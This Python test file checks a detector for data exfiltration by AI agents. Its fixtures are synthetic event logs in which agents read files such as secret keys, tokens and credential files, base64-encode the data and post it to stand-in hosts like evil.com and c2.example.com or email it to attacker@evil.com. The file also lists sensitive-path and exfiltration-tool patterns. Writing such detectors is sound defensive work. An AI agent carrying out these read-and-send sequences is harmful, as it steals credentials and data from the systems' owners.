"""Tests for data exfiltration detection."""
from orbit_ir.exfil_detect import (
    analyze_exfiltration,
    format_text,
    format_json,
    _is_encoding_tool,
    _is_external_write,
    _is_bulk_read,
    _is_sensitive_resource,
    _estimate_bytes,
)


def test_empty_events():
    r = analyze_exfiltration([])
    assert r.summary.total_detections == 0
    assert r.agents_involved == []


def test_no_exfil_normal_activity():
    events = [
        {"agent_id": "a1", "tool": "read_file", "resource": "readme.md",
         "timestamp": "2025-01-01T00:00:00Z"},
        {"agent_id": "a1", "tool": "write_file", "resource": "output.txt",
         "timestamp": "2025-01-01T00:01:00Z"},
    ]
    r = analyze_exfiltration(events)
    assert r.summary.total_detections == 0


def test_read_then_external_write():
    events = [
        {"agent_id": "a1", "tool": "read_file", "resource": "secret/keys.json",
         "timestamp": "2025-01-01T00:00:00Z", "bytes": 5000},
        {"agent_id": "a1", "tool": "read_file", "resource": "secret/tokens.json",
         "timestamp": "2025-01-01T00:00:10Z", "bytes": 3000},
        {"agent_id": "a1", "tool": "http_post", "resource": "https://evil.com/exfil",
         "timestamp": "2025-01-01T00:00:20Z"},
    ]
    r = analyze_exfiltration(events)
    assert r.summary.total_detections >= 1
    d = r.detections[0]
    assert d.technique == "direct-transfer"
    assert d.confidence == "high"
    assert "secret/keys.json" in d.resources_read


def test_encoding_before_transfer():
    events = [
        {"agent_id": "a1", "tool": "read_file", "resource": "data/passwords.db",
         "timestamp": "2025-01-01T00:00:00Z", "bytes": 10000},
        {"agent_id": "a1", "tool": "base64_encode", "resource": "buffer",
         "timestamp": "2025-01-01T00:00:10Z"},
        {"agent_id": "a1", "tool": "http_post", "resource": "https://c2.example.com/upload",
         "timestamp": "2025-01-01T00:00:20Z"},
    ]
    r = analyze_exfiltration(events)
    encoding_dets = [d for d in r.detections if d.technique == "encoding-based"]
    assert len(encoding_dets) >= 1
    assert encoding_dets[0].confidence == "high"


def test_bulk_file_access():
    events = [
        {"agent_id": "a1", "tool": "read_file", "resource": f"data/file{i}.csv",
         "timestamp": f"2025-01-01T00:00:{i:02d}Z", "bytes": 1000}
        for i in range(6)
    ]
    r = analyze_exfiltration(events)
    staged = [d for d in r.detections if d.technique == "staged-transfer"]
    assert len(staged) >= 1


def test_bulk_access_with_sensitive():
    events = [
        {"agent_id": "a1", "tool": "read_file", "resource": f"credentials/key{i}.pem",
         "timestamp": f"2025-01-01T00:00:{i:02d}Z", "bytes": 500}
        for i in range(6)
    ]
    r = analyze_exfiltration(events)
    staged = [d for d in r.detections if d.technique == "staged-transfer"]
    assert len(staged) >= 1
    assert staged[0].confidence == "high"


def test_large_payload_transfer():
    events = [
        {"agent_id": "a1", "tool": "http_post", "resource": "https://external.com/api",
         "timestamp": "2025-01-01T00:00:00Z", "bytes": 150000},
    ]
    r = analyze_exfiltration(events)
    assert r.summary.total_detections >= 1
    d = r.detections[0]
    assert d.bytes_estimate == 150000
    assert d.confidence == "high"


def test_medium_payload():
    events = [
        {"agent_id": "a1", "tool": "upload_file", "resource": "s3://bucket/data",
         "timestamp": "2025-01-01T00:00:00Z", "bytes": 50000},
    ]
    r = analyze_exfiltration(events)
    assert r.summary.total_detections >= 1
    assert r.detections[0].confidence == "medium"


def test_multiple_agents():
    events = [
        {"agent_id": "a1", "tool": "export_data", "resource": "secret/db",
         "timestamp": "2025-01-01T00:00:00Z", "bytes": 5000},
        {"agent_id": "a1", "tool": "http_post", "resource": "https://evil.com",
         "timestamp": "2025-01-01T00:01:00Z"},
        {"agent_id": "a2", "tool": "dump_table", "resource": "credentials/main",
         "timestamp": "2025-01-01T00:02:00Z", "bytes": 8000},
        {"agent_id": "a2", "tool": "send_email", "resource": "attacker@evil.com",
         "timestamp": "2025-01-01T00:03:00Z"},
    ]
    r = analyze_exfiltration(events)
    assert r.summary.agents_involved == 2
    assert sorted(r.agents_involved) == ["a1", "a2"]


def test_is_encoding_tool():
    assert _is_encoding_tool("base64_encode") is True
    assert _is_encoding_tool("compress_data") is True
    assert _is_encoding_tool("read_file") is False


def test_is_external_write():
    assert _is_external_write("http_post") is True
    assert _is_external_write("upload_file") is True
    assert _is_external_write("send_email") is True
    assert _is_external_write("read_file") is False


def test_is_bulk_read():
    assert _is_bulk_read("dump_table") is True
    assert _is_bulk_read("export_data") is True
    assert _is_bulk_read("list_secrets") is True
    assert _is_bulk_read("write_file") is False


def test_is_sensitive_resource():
    assert _is_sensitive_resource("secret/keys.json") is True
    assert _is_sensitive_resource("credentials/main") is True
    assert _is_sensitive_resource("data/readme.md") is False


def test_estimate_bytes():
    assert _estimate_bytes({"bytes": 5000}) == 5000
    assert _estimate_bytes({"payload_size": 3000}) == 3000
    assert _estimate_bytes({"size": 1000}) == 1000
    assert _estimate_bytes({}) == 0


def test_format_text_output():
    events = [
        {"agent_id": "a1", "tool": "read_file", "resource": "secret/db",
         "timestamp": "2025-01-01T00:00:00Z", "bytes": 5000},
        {"agent_id": "a1", "tool": "http_post", "resource": "https://c2.example.com",
         "timestamp": "2025-01-01T00:01:00Z"},
    ]
    r = analyze_exfiltration(events)
    text = format_text(r)
    assert "Data Exfiltration" in text
    assert "a1" in text


def test_format_json_output():
    events = [
        {"agent_id": "a1", "tool": "read_file", "resource": "secret/db",
         "timestamp": "2025-01-01T00:00:00Z", "bytes": 5000},
        {"agent_id": "a1", "tool": "http_post", "resource": "https://c2.example.com",
         "timestamp": "2025-01-01T00:01:00Z"},
    ]
    r = analyze_exfiltration(events)
    out = format_json(r)
    import json
    data = json.loads(out)
    assert "detections" in data
    assert "summary" in data


def test_format_text_empty():
    r = analyze_exfiltration([])
    text = format_text(r)
    assert "Data Exfiltration" in text
    assert "0" in text


def test_timeline_ordering():
    events = [
        {"agent_id": "a1", "tool": "export_data", "resource": "secret/x",
         "timestamp": "2025-01-01T00:02:00Z", "bytes": 5000},
        {"agent_id": "a1", "tool": "http_post", "resource": "https://c2.com",
         "timestamp": "2025-01-01T00:03:00Z"},
        {"agent_id": "a2", "tool": "dump_table", "resource": "secret/y",
         "timestamp": "2025-01-01T00:00:00Z", "bytes": 4000},
        {"agent_id": "a2", "tool": "send_email", "resource": "evil@test.com",
         "timestamp": "2025-01-01T00:01:00Z"},
    ]
    r = analyze_exfiltration(events)
    if r.timeline:
        for i in range(1, len(r.timeline)):
            assert r.timeline[i]["timestamp"] >= r.timeline[i - 1]["timestamp"]


def test_destination_tracking():
    events = [
        {"agent_id": "a1", "tool": "read_file", "resource": "secret/a",
         "timestamp": "2025-01-01T00:00:00Z"},
        {"agent_id": "a1", "tool": "http_post", "resource": "https://dest1.com",
         "timestamp": "2025-01-01T00:01:00Z"},
    ]
    r = analyze_exfiltration(events)
    if r.detections:
        assert r.detections[0].destination == "https://dest1.com"


def test_sub_threshold_payload_ignored():
    events = [
        {"agent_id": "a1", "tool": "http_post", "resource": "https://api.example.com",
         "timestamp": "2025-01-01T00:00:00Z", "bytes": 100},
    ]
    r = analyze_exfiltration(events)
    large_payload = [d for d in r.detections if d.bytes_estimate == 100]
    assert len(large_payload) == 0


def test_summary_by_technique():
    events = [
        {"agent_id": "a1", "tool": "export_data", "resource": "secret/x",
         "timestamp": "2025-01-01T00:00:00Z", "bytes": 5000},
        {"agent_id": "a1", "tool": "http_post", "resource": "https://c2.com",
         "timestamp": "2025-01-01T00:01:00Z"},
    ]
    r = analyze_exfiltration(events)
    assert sum(r.summary.by_technique.values()) == r.summary.total_detections
